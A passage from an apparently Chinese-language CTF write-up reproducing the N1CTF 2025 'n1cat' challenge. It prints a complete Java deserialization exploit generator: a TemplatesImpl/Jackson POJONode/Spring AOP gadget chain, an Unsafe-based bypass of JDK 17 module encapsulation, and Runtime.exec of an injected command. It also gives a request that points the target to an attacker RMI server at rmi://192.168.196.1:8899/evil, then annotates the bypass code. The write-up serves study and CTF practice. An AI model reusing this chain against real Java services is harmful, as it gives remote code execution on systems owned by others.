class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!(cl.getClassLoader() <span class="hljs-keyword">instanceof</span> URLClassLoader)) &#123;<br>                <span class="hljs-built_in">this</span>.writeObject((Object)<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                URL[] us = ((URLClassLoader)cl.getClassLoader()).getURLs();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cb</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>                <span class="hljs-keyword">for</span>(URL u : us) &#123;<br>                    cb = cb + u.toString();<br>                &#125;<br><br>                <span class="hljs-built_in">this</span>.writeObject(cb);<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">annotateProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-built_in">this</span>.annotateClass(cl);<br>        &#125;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ctf.n1cat;<br><br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PayloadGenerator</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool._getDefault_();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> Thread._currentThread_().getContextClassLoader();<br>            jsonNode.toClass(cl, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            System._out_.println(ignored);<br>        &#125;<br>        ArrayList&lt;Class&gt; classes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        classes.add(TemplatesImpl.class);<br>        classes.add(POJONode.class);<br>        classes.add(EventListenerList.class);<br>        classes.add(PayloadGenerator.class);<br>        classes.add(Field.class);<br>        classes.add(Method.class);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">PayloadGenerator</span>().bypassModule(classes);<br><br>        <span class="hljs-type">byte</span>[] code1 = _getTemplateCode_(<span class="hljs-string">&quot;touch /tmp/success&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code2 = ClassPool._getDefault_().makeClass(_randomString_(<span class="hljs-number">6</span>)).toBytecode();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        _setFieldValue_(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        _setFieldValue_(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code1, code2&#125;);<br>        _setFieldValue_(templates, <span class="hljs-string">&quot;_transletIndex&quot;</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(_makeTemplatesImplAopProxy_(templates));<br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">ell</span> <span class="hljs-operator">=</span> _getEventListenerList_(node);<br>        _serialize_(ell, <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> ell;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj, <span class="hljs-type">boolean</span> printBase64) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-keyword">if</span> (printBase64) &#123;<br>            System._out_.println(Base64._getEncoder_().encodeToString(baos.toByteArray()));<br>        &#125;<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImplAopProxy</span><span class="hljs-params">(TemplatesImpl templates)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templates);<br>        Constructor&lt;?&gt; ctor = Class<br>                ._forName_(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>)<br>                .getConstructor(AdvisedSupport.class);<br>        ctor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) ctor.newInstance(advisedSupport);<br>        <span class="hljs-keyword">return</span> Proxy._newProxyInstance_(<br>                ClassLoader._getSystemClassLoader_(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                handler<br>        );<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplateCode(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool._getDefault_();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> pool.makeClass(_randomString_(<span class="hljs-number">6</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>;<br>        template.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> template.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> EventListenerList <span class="hljs-title function_">getEventListenerList</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> (Vector) _getFieldValue_(undo, <span class="hljs-string">&quot;edits&quot;</span>);<br>        v.add(obj);<br><br>        _setFieldValue_(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Class.class, undo&#125;);<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">randomString</span><span class="hljs-params">(<span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">chars</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length);<br>        java.util.<span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Random();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            sb.append(chars.charAt(random.nextInt(chars.length())));<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">(Class&lt;?&gt; clazz, String name, Class&lt;?&gt;[] params)</span> &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">while</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                m = clazz.getDeclaredMethod(name, params);<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>                clazz = clazz.getSuperclass();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> m;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            f.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> (Unsafe) f.get(<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bypassModule</span><span class="hljs-params">(ArrayList&lt;Class&gt; classes)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> _getUnsafe_();<br>            Class&lt;?&gt; currentClass = <span class="hljs-built_in">this</span>.getClass();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">getModule</span> <span class="hljs-operator">=</span> _getMethod_(Class.class, <span class="hljs-string">&quot;getModule&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">if</span> (getModule != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">for</span> (Class c : classes) &#123;<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">targetModule</span> <span class="hljs-operator">=</span> getModule.invoke(c,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>                        unsafe.getAndSetObject(<br>                                currentClass,<br>                                unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>)),<br>                                targetModule<br>                        );<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;&#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Class&lt;?&gt; c = obj.getClass();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span> &amp;&amp; c != <span class="hljs-literal">null</span>; i++) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                f = c.getDeclaredField(fieldName);<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                c = c.getSuperclass();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (f == <span class="hljs-literal">null</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchFieldException</span>(fieldName);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> f.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>配好 javassist、slf4j、logback 等几项依赖后在 IDEA 的运行或调试选项处要配置虚拟机选项，否则不能正常运行</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-attr">--add-opens</span>=java.base/sun<span class="hljs-selector-class">.nio</span>.ch=ALL-UNNAMED <br><span class="hljs-attr">--add-opens</span>=java.base/java.lang=ALL-UNNAMED <br><span class="hljs-attr">--add-opens</span>=java.base/java.io=ALL-UNNAMED <br><span class="hljs-attr">--add-opens</span>=jdk.unsupported/sun.misc=ALL-UNNAMED <br><span class="hljs-attr">--add-opens</span>=java.xml/com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax=ALL-UNNAMED <br><span class="hljs-attr">--add-opens</span>=java.base/java<span class="hljs-selector-class">.lang</span>.reflect=ALL-UNNAMED<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/VxuYbCfLmoMl1FxlmmGcIkBWnLg.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问靶机页面添加 url 参数为 rmiServer 的 url</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">/?<span class="hljs-attr">name</span><span class="hljs-operator">=</span>n1cat<span class="hljs-variable">&amp;word</span>=hello<span class="hljs-variable">&amp;url</span>=rmi:<span class="hljs-comment">//192.168.196.1:8899/evil</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/GGvObTb5doDacrxLptUcJ0eHnGb.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功执行命令完成复现</p>
+<p><img src="/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/Rs7Pbs9O8ocVKUxHc9CcDiUjntf.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="尝试分析"><a href="#尝试分析" class="headerlink" title="尝试分析"></a>尝试分析</h3><p>之前学习过 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15946406.html">bitterz</a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15946406.html">的文章</a>，首先在 jdk17 的版本下，默认不会信任远程 Reference 类，需要利用本地工厂类或者服务端返回字节码利用受害者存在的 gadget 触发原生反序列化。其次，jdk9 及之后的 java 版本中进行了更严格的模块化封装，导致内部类无法直接访问、常用的反射手段受到了很大的限制</p>
+<p>所给 poc 中如下的 <code>getUnsafe()</code> 函数和 <code>bypassModule</code> 函数可以绕过 JPMS</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (Unsafe) f.get(<span class="hljs-literal">null</span>);<span class="hljs-comment">//反射获取Unsafe类实例</span><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(e);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bypassModule</span><span class="hljs-params">(ArrayList&lt;Class&gt; classes)</span> &#123;<span class="hljs-comment">//参数classes即所有需要绕过模块限制的类的一个数组</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> _getUnsafe_();<br>        Class&lt;?&gt; currentClass = <span class="hljs-built_in">this</span>.getClass();<span class="hljs-comment">//获取当前运行时Class对象</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">getModule</span> <span class="hljs-operator">=</span> _getMethod_(Class.class, <span class="hljs-string">&quot;getModule&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<span class="hljs-comment">//调用poc中自己写的getMethod方法获取Class类的getModule方法</span><br>            <span class="hljs-keyword">if</span> (getModule != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">for</span> (Class c : classes) &#123;<span class="hljs-comment">//遍历所有需要绕过的类</span><br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">targetModule</span> <span class="hljs-operator">=</span> getModule.invoke(c,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<span class="hljs-comment">//调用getModule方法获取目标类所属的模块</span><br>                    unsafe.getAndSetObject(<span class="hljs-comment">//获取对象字段的值并设置新值（遍历过程中即按序覆盖）</span><br>                            currentClass,<span class="hljs-comment">//目标对象，即本类PayloadGenerator</span><br>                            unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>)),<span class="hljs-comment">//内存偏移量</span><br>                            targetModule<span class="hljs-comment">//新值，即目标类的所属模块</span><br>                    );<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;&#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>一个类的 module 字段由它的 ClassLoader 是否关联某个 ModuleLayer 决定（是否含有 module-info.java，是否使用–module-path 等），其他未加指定的类所属 module 均为 unnamed，大多数攻击环境都不会模块化部署所以攻击代码一般都视作 unnamed module 处理。而我们需要利用的类如 TemplatesImpl 属于 java.xml 模块，在 jdk17 的强封装机制下攻击代码就无法调用。</p>
+<p>Unsafe 类是 Java 中一个提供底层操作能力的类，它位于 sun.misc 包下，允许开发者直接对内存进行操作，尤其需要注意的是它提供了修改类的 Class 对象的 module 字段的能力。本处先通过反射获取 Unsafe 类的实例，而后利用其 getAndSetObject 方法（putObject 方法具有同样的功能）修改 poc 自身类的 module 字段为目标类的 module，从而绕过模块封装机制。</p>
+<p>解决模块封装问题后研究利用链的组成。所给 poc 中 <code>getPayload()</code> 方法包含利用链的主体。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//首先移除Jackson的反序列化保护</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool._getDefault_();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        jsonNode.removeMethod(writeReplace);<span class="hljs-comment">//移除writeReplace方法</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> Thread._currentThread_().getContextClassLoader();<br>        jsonNode.toClass(cl, <span class="hljs-literal">null</span>);<span class="hljs-comment">//动态重新加载修改后的类</span><br>    &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>        System._out_.println(ignored);<br>    &#125;<br>    ArrayList&lt;Class&gt; classes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<span class="hljs-comment">//把用到的类的class对象都用bypassModule绕过限制</span><br>    classes.add(TemplatesImpl.class);<span class="hljs-comment">//添加顺序按使用顺序排列，确保每次操作时module检测可以通过</span><br>    classes.add(POJONode.class);<br>    classes.add(EventListenerList.class);<br>    classes.add(PayloadGenerator.class);<br>    classes.add(Field.class);<br>    classes.add(Method.class);<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">PayloadGenerator</span>().bypassModule(classes);<br><br>    <span class="hljs-type">byte</span>[] code1 = _getTemplateCode_(<span class="hljs-string">&quot;touch /tmp/success&quot;</span>);<span 